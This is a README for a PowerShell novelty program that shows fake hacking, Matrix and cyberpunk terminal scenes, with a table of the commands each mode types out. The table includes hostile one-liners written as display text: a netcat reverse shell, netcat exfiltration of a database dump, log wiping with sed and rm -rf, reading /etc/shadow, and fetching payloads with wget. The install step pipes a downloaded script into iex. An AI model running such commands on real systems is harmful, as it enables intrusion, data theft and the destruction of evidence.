# Ultra Matrix Terminal

15 cinematic terminal simulation modes for Windows, Linux, and macOS — realistic SSH sessions, CTF challenges, Hollywood hacking, cyberpunk netrunning, and more. No external dependencies, pure PowerShell 5.1+ / PowerShell Core 7+.

## One-Liner Install

```powershell
irm https://raw.githubusercontent.com/SanTobinoOfficial/matrixhacker/main/install.ps1 | iex
```

## Manual Start

```powershell
.\launcher.ps1          # WinForms GUI (Windows only, else CLI)
.\launcher.ps1 -CLI     # Terminal menu
.\launcher.ps1 -Mode realistic  # Launch mode directly
.\launcher.ps1 -Help    # Show usage
```

## Modes

| # | Mode | Description |
|---|------|-------------|
| 1 | Realistic Terminal | Authentic Linux Debian server session |
| 2 | Hollywood Hacker | Hollywood-style hacking simulation |
| 3 | Cyberpunk 2077 | Netrunner in Night City |
| 4 | The Matrix | Wake up, Neo |
| 5 | Mr. Robot | F Society strikes again |
| 6 | Production Outage | Handle a SEV-1 incident |
| 7 | Linux Tutorial | Learn Linux basics interactively |
| 8 | Pentest Report | Penetration testing simulation |
| 9 | SysAdmin Simulator | Manage servers and backups |
| 10 | Data Heist | Steal data, cover your tracks |
| 11 | Horror Terminal | Something is watching you |
| 12 | Polska Hacker | Polski hacker w akcji |
| 13 | Dark Web | Navigate the darknet |
| 14 | CTF Challenge | Find the hidden flag |
| 15 | Matrix Screensaver | Infinite Matrix rain |

## Commands per Mode

| Mode | Commands |
|------|----------|
| realistic | `whoami`, `hostname`, `id`, `ls -la /etc/nginx/`, `cat /etc/nginx/nginx.conf`, `systemctl status sshd`, `journalctl -u nginx`, `df -h`, `free -m`, `ps aux`, `tail /var/log/syslog`, `netstat -tulpn`, `uptime`, `cat /etc/os-release` |
| hollywood | `nmap -sV -sC -p- 10.0.0.1`, `ssh root@10.0.0.1`, `msfconsole -q`, `searchsploit apache 2.4.49`, `sqlmap -u http://10.0.0.1/login`, `hydra -l admin -P rockyou.txt ssh://10.0.0.1`, `aircrack-ng capture.cap`, `john --show hash.txt`, `metasploit`, `whois 10.0.0.1`, `ping -c 5 google.com`, `traceroute 8.8.8.8`, `nmap -A -T4 scanme.org`, `nikto -h 10.0.0.1`, `exploit db 50052` |
| cyberpunk | `netstat -an`, `ping -c 1 ICE_primary.nightcity`, `ssh netrunner@datafort.arasaka`, `ls -la /sys/net/`, `cat /sys/net/access.log`, `./icebreaker --target arasaka --port 443`, `nmap -sS arasaka-tower.corp`, `cat /home/netrunner/.profile`, `scp data_encrypted.bin netrunner@datafort:/extract/`, `lsblk`, `dmesg`, `ps aux --forest`, `systemctl status ICE_firewall`, `dd if=/dev/urandom of=./payload.bin bs=1024 count=512` |
| matrix | `wget http://221.24.83.211/construct`, `file construct`, `cat /proc/version`, `ls -la /dev/matrix/`, `cat /dev/matrix/read`, `./construct --decode --file /dev/matrix/read`, `nc -lvp 4444`, `echo $MATRIX`, `ssh neo@zion`, `run`, `cat TheOne.txt`, `ls /sys/`, `cat /etc/matrix/access`, `find / -name "oracle" -type f` |
| mrrobot | `ls -la`, `cat /home/elliot/.bash_history`, `pwd`, `cat /etc/passwd`, `ps aux`, `sudo nmap -sS 10.0.0.0/24`, `ssh fsociety@192.168.1.100`, `cat evilarcorp.txt`, `wget http://pastebin.com/raw/fsociety`, `chmod +x fsociety.ps1`, `./fsociety.ps1`, `./fsociety.ps1 --deploy --target ecorp`, `rm -rf /logs/`, `shutdown -h now` |
| outage | `ssh admin@web-01.prod`, `systemctl status nginx`, `journalctl -u nginx --no-pager -n 50`, `curl -I http://localhost`, `df -h`, `tail -n 100 /var/log/nginx/error.log`, `systemctl restart nginx`, `systemctl status nginx`, `free -m`, `htop`, `cat /etc/nginx/sites-enabled/default`, `nginx -t`, `systemctl reload nginx`, `uptime` |
| tutorial | `whoami`, `pwd`, `ls`, `cd /home`, `cat /etc/passwd`, `echo "Hello World"`, `ls -la`, `mkdir test && cd test`, `touch file.txt`, `cp file.txt file2.txt`, `mv file2.txt ../`, `rm file.txt`, `man ls`, `chmod +x script.sh`, `exit` |
| pentest | `nmap -sV -sC -A 10.0.0.0/24`, `whatweb 10.0.0.5`, `gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt`, `searchsploit Apache 2.4.49`, `nc -lvnp 4444`, `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `whoami`, `cat /etc/shadow`, `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`, `mysql -u root -p`, `show databases;`, `SELECT * FROM users;`, `sqlmap -r request.txt --batch`, `msfconsole -q`, `hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt` |
| sysadmin | `ssh admin@srv-backup`, `lsblk`, `df -h`, `tar -czvf backup.tar.gz /var/www/`, `scp backup.tar.gz admin@srv-backup:/backups/`, `systemctl status postgresql`, `free -m`, `cat /etc/fstab`, `rsync -avz /var/www/ admin@10.0.0.10:/var/www/`, `crontab -l`, `cat /var/log/syslog`, `du -sh /var/log/`, `apt update && apt upgrade -y`, `reboot` |
| heist | `nmap -sS -T4 -p- 10.0.0.5`, `ssh root@10.0.0.5`, `ls -la /root/`, `cat /root/credentials.txt`, `mysql -u admin -p -h 10.0.0.5`, `show databases;`, `SELECT * FROM customers;`, `mysqldump -u admin -p --all-databases > dump.sql`, `tar -czf data.tar.gz *.sql`, `nc -w 3 10.0.0.1 4444 < data.tar.gz`, `rm -rf dump.sql data.tar.gz`, `cat /var/log/auth.log`, `sed -i '/10.0.0.1/d' /var/log/auth.log`, `shutdown -h now` |
| horror | `whoami`, `ls -la`, `cat README.txt`, `cat /var/log/system.log`, `ps aux`, `find / -name "*.bak" -type f`, `cat /tmp/.hidden_note`, `file /tmp/anomaly`, `strings /tmp/anomaly`, `dd if=/dev/sda bs=512 count=1 | strings`, `ping -c 1 127.0.0.1`, `watch -n 1 ps aux`, `journalctl --no-pager -n 200`, `cat /dev/urandom` |
| polska | `whoami`, `cat /etc/polska/hostname`, `ls -la /sys/hakerskie/`, `nmap -sS -T4 -p- 10.0.0.1`, `ssh root@10.0.0.1`, `cat /etc/passwd`, `ls /root/`, `sqlmap -u http://10.0.0.1/login --dbs`, `nc -e /bin/bash 10.0.0.1 4444`, `cat /root/flaga.txt`, `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `mysql -u root -p`, `SELECT * FROM users;`, `wget http://10.0.0.1/payload`, `rm -rf /var/log/` |
| darkweb | `torsocks curl http://darknet`, `ping -c 3 10.0.0.3`, `ssh anonymous@10.0.0.3`, `ls -la /darknet/`, `cat /darknet/README`, `nmap -sS darknet`, `curl -s http://darknet/market`, `dd if=/dev/urandom of=crypto_key.bin bs=32 count=1`, `gpg --symmetric --cipher AES256 data.bin`, `curl http://darknet/upload -F file=@data.bin.gpg`, `cat /var/log/tor.log`, `python3 -c "import hashlib; print(hashlib.sha256(b'blockchain').hexdigest())"`, `kill -9 31337`, `exit` |
| ctf_mode | `whoami`, `ls -la`, `cat README`, `nmap -p- 10.0.0.1`, `gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/common.txt`, `curl -s http://10.0.0.1/robots.txt`, `cat /home/ctf/.bash_history`, `find / -name "flag*" 2>/dev/null`, `cat /root/flag.txt`, `ssh ctf-player@10.0.0.1`, `python3 -c 'import base64; print(base64.b64decode("Q1RGe0" + "xhYm9" + "yYXRvcnl" + "fRmxhZ30=").decode())'`, `export FLAG=CTF{...}`, `echo $FLAG`, `cat /etc/ctf/challenge.conf` |
| screensaver | *(no commands — infinite Matrix rain with overlay messages)* |

## Features

- **Matrix Rain v3** — multi-style falling columns, overlay typing, bright heads, fading trails
- **Press-to-Reveal** — commands auto-type with realistic speed; press Enter to finish instantly
- **Smart Delays** — nmap scans pause longer than ls; contextual timing per command
- **Auto-Typos** — ~20% of commands have a typo + correction (backspace + retype)
- **Dir Tracking** — `cd` commands update the simulated prompt path
- **History Recall** — Up arrow recalls the last command
- **System Noise** — random syslog messages, mail alerts, broadcast warnings
- **Pager** -- `--More--` for output longer than terminal height
- **MOTD** — per-session message of the day with load/mem stats
- **Failure Simulation** — ~20% context-aware command failures
- **Session Timeout** — auto-exit after ~5 minutes per mode
- **Escape to Exit** — press Escape at any time to quit
- **Cross-Platform** — Windows (PS 5.1+), Linux, macOS (PowerShell Core 7+)

## Project Structure

```
ultra-matrix-terminal/
├── launcher.ps1        # WinForms GUI + CLI launcher
├── install.ps1         # One-liner installer
├── engine/
│   ├── core.ps1        # Matrix-Rain, Type-Command, Show-Output, session loop
│   ├── helpers.ps1     # Utility functions (Rand, RandIP, C, Get-DynamicPrompt)
│   ├── platform.ps1    # OS detection, install dirs, shortcuts, PATH
│   └── themes.ps1      # 15 theme definitions (colors, char sets, overlay messages)
├── modes/
│   ├── realistic.ps1   # Mode 1: Realistic Terminal
│   ├── hollywood.ps1   # Mode 2: Hollywood Hacker
│   ├── cyberpunk.ps1   # Mode 3: Cyberpunk 2077
│   ├── matrix.ps1      # Mode 4: The Matrix
│   ├── mrrobot.ps1     # Mode 5: Mr. Robot
│   ├── outage.ps1      # Mode 6: Production Outage
│   ├── tutorial.ps1    # Mode 7: Linux Tutorial
│   ├── pentest.ps1     # Mode 8: Pentest Report
│   ├── sysadmin.ps1    # Mode 9: SysAdmin Simulator
│   ├── heist.ps1       # Mode 10: Data Heist
│   ├── horror.ps1      # Mode 11: Horror Terminal
│   ├── polska.ps1      # Mode 12: Polska Hacker
│   ├── darkweb.ps1     # Mode 13: Dark Web
│   ├── ctf_mode.ps1    # Mode 14: CTF Challenge
│   └── screensaver.ps1 # Mode 15: Matrix Screensaver
├── assets/
│   └── splash/         # Ascii art splash screens
└── config/             # User settings (future)
```

## Requirements

- **Windows**: PowerShell 5.1+ (built-in)
- **Linux / macOS**: PowerShell Core 7+ (`pwsh`)
- No external dependencies

## License

MIT
